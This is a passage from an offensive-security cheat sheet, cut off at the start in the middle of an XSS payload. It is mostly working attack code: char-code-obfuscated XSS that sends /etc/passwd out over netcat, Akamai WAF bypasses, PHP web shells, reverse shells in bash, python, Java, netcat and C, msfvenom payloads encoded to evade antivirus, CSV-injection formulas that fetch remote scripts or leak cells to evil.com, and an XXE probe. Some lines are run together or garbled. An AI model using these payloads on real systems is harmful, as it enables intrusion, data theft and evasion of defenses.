2,101,58,39,105,103,110,111,114,101,39,125,44,123,116,121,112,101,58,39,105,103,110,111,114,101,39,125,93,125,41,59,10,60,47,115,99,114,105,112,116,62))>](http://)

# Payload 2: exec(Attacker Reverse netcat stolen => /etc/passwd) && exec(calc)
<audio src=x onerror=writeln(String.fromCharCode(10,60,97,117,100,105,111,32,115,114,99,61,120,32,111,110,101,114,114,111,114,61,34,99,111,110,115,116,32,101,120,101,99,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,59,10,101,120,101,99,40,39,110,99,32,45,119,32,51,32,49,57,50,46,49,54,56,46,49,49,49,46,49,50,57,32,49,51,51,55,32,60,32,47,101,116,99,47,112,97,115,115,119,100,39,44,32,40,101,44,32,115,116,100,111,117,116,44,32,115,116,100,101,114,114,41,61,62,32,123,32,105,102,32,40,101,32,105,110,115,116,97,110,99,101,111,102,32,69,114,114,111,114,41,32,123,10,99,111,110,115,111,108,101,46,101,114,114,111,114,40,101,41,59,32,116,104,114,111,119,32,101,59,32,125,32,99,111,110,115,111,108,101,46,108,111,103,40,39,115,116,100,111,117,116,32,39,44,32,115,116,100,111,117,116,41,59,10,99,111,110,115,111,108,101,46,108,111,103,40,39,115,116,100,101,114,114,32,39,44,32,115,116,100,101,114,114,41,59,125,41,59,10,97,108,101,114,116,40,39,49,39,41,34,62,60,115,99,114,105,112,116,62,10,118,97,114,32,80,114,111,99,101,115,115,32,61,32,112,114,111,99,101,115,115,46,98,105,110,100,105,110,103,40,39,112,114,111,99,101,115,115,95,119,114,97,112,39,41,46,80,114,111,99,101,115,115,59,10,118,97,114,32,112,114,111,99,32,61,32,110,101,119,32,80,114,111,99,101,115,115,40,41,59,10,112,114,111,99,46,111,110,101,120,105,116,32,61,32,102,117,110,99,116,105,111,110,40,97,44,98,41,32,123,125,59,10,118,97,114,32,101,110,118,32,61,32,112,114,111,99,101,115,115,46,101,110,118,59,10,118,97,114,32,101,110,118,95,32,61,32,91,93,59,10,102,111,114,32,40,118,97,114,32,107,101,121,32,105,110,32,101,110,118,41,32,101,110,118,95,46,112,117,115,104,40,107,101,121,43,39,61,39,43,101,110,118,91,107,101,121,93,41,59,10,112,114,111,99,46,115,112,97,119,110,40,123,102,105,108,101,58,39,47,117,115,114,47,98,105,110,47,103,110,111,109,101,45,99,97,108,99,117,108,97,116,111,114,39,44,99,119,100,58,110,117,108,108,44,119,105,110,100,111,119,115,86,101,114,98,97,116,105,109,65,114,103,117,109,101,110,116,115,58,102,97,108,115,101,44,100,101,116,97,99,104,101,100,58,102,97,108,115,101,44,101,110,118,80,97,105,114,115,58,101,110,118,95,44,115,116,100,105,111,58,91,123,116,121,112,101,58,39,105,103,110,111,114,101,39,125,44,123,116,121,112,101,58,39,105,103,110,111,114,101,39,125,44,123,116,121,112,101,58,39,105,103,110,111,114,101,39,125,93,125,41,59,10,60,47,115,99,114,105,112,116,62))>

Limited case Akamai WAF bypass:
<xhzeem/x=" onmouseover=eva&#x6c;?.(id+/(document.domain)/.source) id=confirm>
// Works in cases where double quotes are escaped <xhzeem/x=\" ....> can also work with single quotes (change it in the payload)

Limited case Akamai WAF bypass:
<div class=xhzeem*/eval?.(value+/()/.source)//"><input value=confirm autofocus onfocus='/*""></div>
// Works in cases where there are multiple reflection points. Don't forget to URL encode the [+] => [%2B] symbol if it's a GET parameter
```
 
### PHP
Execute one command
```
<?php system("whoami"); ?>
<?php echo shell_exec("nc.exe -nlvp 4444 -C:\Windows\System32\cmd.exe");?># Take input from the url paramter. shell.php?cmd=whoami
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET["cmd"]); ?>
<? passthru($_GET["cmd"]); ?>
php -r '$sock=fsockopen("ATTACKING-IP",80);exec("/bin/sh -i <&3 >&3 2>&3");'
<?php $c=$_GET[‘c’]; echo '$c'; ?># The same but using passthru
<?php passthru($_GET['cmd']); ?># For shell_exec to output the result you need to echo it
<?php echo shell_exec("whoami");?># preg_replace(). This is a cool trick
<?php preg_replace('/.*/e', 'system("whoami");', ''); ?># Using backticks
<?php $output = 'whoami'; echo "<pre>$output</pre>"; ?># Using backticks
<?php echo 'whoami'; ?># upload nc.php
<?php echo system("nc -lvp 81 -e cmd.exe");?>
```

### Using NC
Bash
```
0<&196;exec 196<>/dev/tcp/192.168.1.101/80; sh <&196 >&196 2>&196
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
bash -i >& /dev/tcp/<your ip>/<your port> 0>&1
nc -nlvp 443
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <your ip> <your port> >/tmp/f
```
python:
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.0.0.1",1234));
os.dup2(s.fileno(),0); 
os.dup2(s.fileno(),1); 
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);
```
Java
```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
netcat:
# netcat bind shell
```
nc -vlp 5555 -e /bin/bash
nc 192.168.1.101 5555# netcat reverse shell
nc -lvp 5555
nc 192.168.1.101 5555 -e /bin/bash# With -e flag
nc -e /bin/sh <your ip> <your port># Without -e flag
rm -f /tmp/p; mknod /tmp/p p && nc ATTACKING-IP 4444 0/tmp/p
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```
--------------------------------------------------------------------
```
#include <stdlib.h>
int main () {
system("nc.exe -e cmd.exe <myip> <myport>");
return 0;
}
```
--------------------------------------------------------------------

### Msfvenom

Msfvenom
```
msfvenom -p windows/shell_reverse_tcp LHOST=<your ip> LPORT=<your port> -f exe -o shell_reverse.exe
```
to avoid AV detection, use encryption
```
msfvenom -p windows/shell_reverse_tcp LHOST=<your ip> LPORT=<your port> -f exe -e x86/shikata_ga_nai -i 9 -o shell_reverse_msf_encoded.exe
```
php
```
msfvenom -p php/meterpreter_reverse_tcp LHOST=<your ip> LPORT=<your port> -f raw > shell.php
```
asp
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your ip> LPORT=<your port> -f asp > shell.asp
```
war
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<your ip> LPORT=<your port> -f war > shell.war
```
JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<your ip> LPORT=<your port> -f raw > shell.jsp
```
binary
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=443 -f elf > shell.elf
```
List linux meterpreter payloads
```
msfvenom --list | grep xxxx
```
Send linux shell to meterpreter
```
msfvenom -p linux/x64/meterpreter/reverse_tcp lhost= lport= -f elf -o msf.bin (set multi handler then)
```



### CSV Injection - At present, the best defense strategy we are aware of is prefixing cells that start with ‘=’ , ‘+’ or ‘-’ with an apostrophe. 
```
@SUM(1+9)*cmd|' /C calc'!A0
=cmd|’/C calc.exe’!Z0
=cmd|’/Cpowershell Import-Module BitsTransfer; Start-BitsTransfer - source https://141.io/shell.ps; Invoke-Item shell.ps;’!z
=cmd|’/Ccalc.exe’!z
=HYPERLINK(“http://evil.com?x="&A3&","&B3&"[CR]","Error fetching info: Click me to resolve.”)
```
 
### XXE
```
<fkpxmlns="http://a.b/"xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"xsi:schemaLocation="http://a.b/http://wiiyjpk3neg58qeu4vb5j8vpcgi86x.burpcollaborator.net/fkp.xsd">fkp</fkp>
```
